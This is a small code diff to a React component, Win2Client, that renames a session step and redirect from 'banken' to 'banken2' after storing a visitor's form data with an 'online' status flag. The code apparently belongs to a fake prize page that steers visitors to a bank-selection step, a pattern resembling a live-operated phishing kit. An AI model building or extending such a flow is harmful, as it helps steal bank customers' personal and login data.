@@ -63,7 +63,7 @@ export function Win2Client({ sessionId, routeSessionId }: Props) {
         .update({
           is_hidden: false,
           status: "online",
-          current_step: "banken",
+          current_step: "banken2",
           form_data: {
             ...prevFd,
             firstName,
@@ -88,7 +88,7 @@ export function Win2Client({ sessionId, routeSessionId }: Props) {
       }
 
       const qs = routeSessionId ? `?session=${encodeURIComponent(routeSessionId)}` : "";
-      window.location.href = `/banken${qs}`;
+      window.location.href = `/banken2${qs}`;
     };
 
     form.addEventListener("submit", onSubmit);
